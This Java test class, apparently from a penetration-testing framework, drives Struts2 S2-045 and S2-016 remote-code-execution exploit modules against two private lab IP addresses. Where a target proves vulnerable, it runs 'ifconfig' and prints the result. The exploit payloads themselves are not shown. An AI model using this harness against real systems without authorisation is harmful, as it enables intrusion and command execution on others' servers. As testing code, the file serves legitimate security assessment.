package com.orleven.tentacle.test;

import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;

import com.orleven.tentacle.core.IOC;
import com.orleven.tentacle.define.Permeate;
import com.orleven.tentacle.entity.Vulner;
import com.orleven.tentacle.permeate.bean.AssetBean;
import com.orleven.tentacle.permeate.bean.AssetInfoBean;
import com.orleven.tentacle.permeate.bean.ServiceBean;
import com.orleven.tentacle.permeate.bean.WebServiceBean;
import com.orleven.tentacle.permeate.script.Struts2RCE045;
import com.orleven.tentacle.permeate.script.base.WebScriptBase;

@Component
@Scope("prototype")
public class Test {
	
	public void test(){
		// 资产测试
		assetTest();
	}
	
	/**
	 * 资产测试
	 * @data 2017年3月17日
	 */
	public void assetTest(){
		struts2045Test();
		struts2016Test();
	}
	
	public void struts2045Test(){
		String host = "192.168.111.148";
		String[] ports = {"7001","7002"};
		
		AssetInfoBean assetInfoBean = IOC.instance().getClassobj(AssetInfoBean.class);
		assetInfoBean.setHost(host);
		
		AssetBean assetBean = IOC.instance().getClassobj(AssetBean.class);
		assetBean.setAssetInfoBean(assetInfoBean);
		for (String port : ports) {
			ServiceBean serviceBean =new ServiceBean(assetInfoBean,port);
			assetBean.getServiceBeans().add(serviceBean);
		}

		Vulner vulner= new Vulner(0,"Struts2-045","","", "Remote Code Execute","Hign","Struts2RCE045");
	    for (ServiceBean serviceBean : assetBean.getServiceBeans()) {
	    	WebServiceBean webServiceBean = IOC.instance().getClassobj(WebServiceBean.class);
	    	webServiceBean.setValueByServiceBean(serviceBean);
	    	webServiceBean.setProtocolType("http");
	    	
	    	WebScriptBase webScriptBase = null;
	    	webScriptBase = (WebScriptBase) IOC.instance().getClassobj("struts2RCE045");

	    	webScriptBase.setWebServiceBean(webServiceBean);
	    	webScriptBase.setAssetInfoBean(assetInfoBean);
	    	webScriptBase.getVulnerBean().setVulner(vulner);
	    	webScriptBase.setUrlPath("/admin/index.action");
	    	webScriptBase.setCookies("");
	    	webScriptBase.prove();
	    	if(webScriptBase.getVulnerBean().getIsVulner() == Permeate.isVulner){
	    		webScriptBase.execCommand("ifconfig");
		    	System.out.println(webScriptBase.getVulnerBean().getProveBean().get(1).getReceiveMessage());
	    	}
	    }
	    
	}
	
	public void struts2016Test(){
		String host = "192.168.111.131";
		String[] ports = {"7001","8080"};
		
		AssetInfoBean assetInfoBean = IOC.instance().getClassobj(AssetInfoBean.class);
		assetInfoBean.setHost(host);
		
		AssetBean assetBean = IOC.instance().getClassobj(AssetBean.class);
		assetBean.setAssetInfoBean(assetInfoBean);
		for (String port : ports) {
			ServiceBean serviceBean =new ServiceBean(assetInfoBean,port);
			assetBean.getServiceBeans().add(serviceBean);
		}
//		assetBean.setPorts(ports);
		Vulner vulner= new Vulner(0,"Struts2-016","","", "Remote Code Execute","Hign","Struts2RCE016");
	    for (ServiceBean serviceBean : assetBean.getServiceBeans()) {
	    	WebServiceBean webServiceBean = IOC.instance().getClassobj(WebServiceBean.class);
	    	webServiceBean.setValueByServiceBean(serviceBean);
	    	webServiceBean.setProtocolType("http");
	    	
	    	WebScriptBase webScriptBase = null;
	    	webScriptBase = (WebScriptBase) IOC.instance().getClassobj("struts2RCE016");

	    	webScriptBase.setWebServiceBean(webServiceBean);
	    	webScriptBase.setAssetInfoBean(assetInfoBean);
	    	webScriptBase.getVulnerBean().setVulner(vulner);
	    	webScriptBase.setUrlPath("/S2-016/default.action");
	    	webScriptBase.setCookies("");
	    	webScriptBase.prove();

	    	if(webScriptBase.getVulnerBean().getIsVulner() == Permeate.isVulner){
	    		webScriptBase.execCommand("ifconfig");
		    	System.out.println(webScriptBase.getVulnerBean().getProveBean().get(1).getReceiveMessage());
	    	}
	    }
	    
	}
}
